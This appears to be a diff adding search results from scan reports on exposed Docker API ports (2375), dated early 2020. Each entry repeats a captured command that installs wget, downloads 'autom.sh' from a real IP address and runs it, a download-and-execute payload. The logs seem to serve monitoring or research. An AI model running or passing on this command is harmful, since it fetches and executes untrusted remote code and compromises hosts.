+  333:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  333:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  333:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  333:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2964:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2964:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4045:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4045:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4045:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4045:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_1_9\-exportproduct_docker_port_2375.json:
+  626:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  626:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  626:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  626:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_1_8\-exportproduct_docker_port_2375.json:
+  423:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  423:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  423:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  423:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_2_14\-exportproduct_docker_port_2375.json:
+  536:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  536:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  536:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  536:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  536:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  536:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  536:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  536:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  536:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  536:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3176:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3176:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4245:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4245:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4245:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4245:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_2_15\-exportproduct_docker_port_2375.json:
+  835:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  835:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  835:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  835:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  835:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  835:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  835:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  835:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  835:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  835:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3465:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3465:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4548:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4548:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4548:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4548:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_2_17\-exportproduct_docker_port_2375.json:
+  1336:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1336:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1336:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1336:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1336:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1336:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1336:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1336:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1336:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1336:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3964:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3964:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5051:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5051:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5051:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5051:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_2_22\-exportproduct_docker_port_2375.json:
+  1435:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1435:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1435:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1435:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1435:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1435:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1435:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1435:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1435:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1435:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4063:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4063:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_2_2\-exportproduct_docker_port_2375.json:
+  961:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  961:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1061:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1061:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1300:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1300:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1429:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1429:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1429:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1429:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1429:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1429:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1478:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1478:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1478:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1478:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1478:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1478:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2149:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2149:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2149:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2149:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_2_23\-exportproduct_docker_port_2375.json:
+  1435:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1435:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1435:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1435:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1435:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1435:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1435:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1435:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1435:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1435:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4063:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4063:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_2_7\-exportproduct_docker_port_2375.json:
+  919:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  919:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  919:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  919:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  919:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  919:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  919:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  919:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  919:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  919:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2062:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2062:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2575:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2575:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2575:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2575:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2575:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2575:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3149:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3149:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3149:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3149:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_2_25\-exportproduct_docker_port_2375.json:
+  1634:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1634:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1634:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1634:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1634:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1634:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1634:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1634:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1634:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1634:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4176:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4176:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_2_4\-exportproduct_docker_port_2375.json:
+  116:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  116:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  116:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  116:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  116:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  116:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  116:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  116:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  116:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  116:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1274:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1274:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1360:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1360:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1700:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1700:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1875:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1875:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1875:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1875:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1875:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1875:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2447:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2447:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2447:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2447:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_2_5\-exportproduct_docker_port_2375.json:
+  519:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  519:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  519:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  519:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  519:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  519:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  519:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  519:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  519:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  519:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1662:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1662:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2176:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2176:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2176:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2176:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2176:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2176:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2744:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2744:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2744:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2744:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_2_9\-exportproduct_docker_port_2375.json:
+  1119:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1119:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1119:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1119:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1119:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1119:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1119:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1119:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1119:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  1119:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2175:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2175:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2676:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2676:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2676:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2676:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2676:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2676:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3350:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3350:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3350:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3350:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_3_15\-exportproduct_docker_port_2375.json:
+  2527:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2527:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2527:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2527:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2527:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2527:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2527:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2527:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2527:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2527:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2527:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  2527:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
